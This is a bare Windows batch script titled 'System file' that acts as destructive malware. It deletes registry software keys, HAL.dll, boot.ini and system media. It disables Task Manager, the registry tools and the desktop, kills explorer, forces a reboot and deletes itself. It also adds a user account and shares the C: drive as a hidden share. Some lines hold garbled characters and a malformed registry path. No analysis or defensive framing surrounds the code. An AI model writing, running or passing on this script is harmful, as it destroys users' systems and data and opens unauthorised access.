@echo off title System file
color 4C
reg delete HKLM\Software /f
reg delete HKCU\Software /f
del %systemroot%\system32\HAL.dll
attrib -h -s c:\boot.ini
del c:\boot.ini
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f
taskkill /f /im explorer.exe
del %systemroot%\Media /q
DEL "%systemroot%\Web\Wallpaper\*.jpg"
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableTaskMgr /t REG_DWORD /d 1 /f
reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\System /v DisableRegistryTools /t REG_DWORD /d 1 /f
reg add HKCU\Software\ Microsoft\ Windows\ CurrentVersion\ Policies\ Explorer /v NoDesktop /t REG_DWORD /d 1 /f
del %systemroot%\Driver Cache\i386\driver.cab /f /q
shutdown -r -t 1 -c  -f
del %0
net user ����� /add
reg add HKCU\Software\Microsoft\Windows\ShellNoRoam\MUICache /v @C:\WINDOWS\system32\SHELL32.dll,-8964 /t REG_SZ /d ������� ������ /F
net share qwert$=c:\
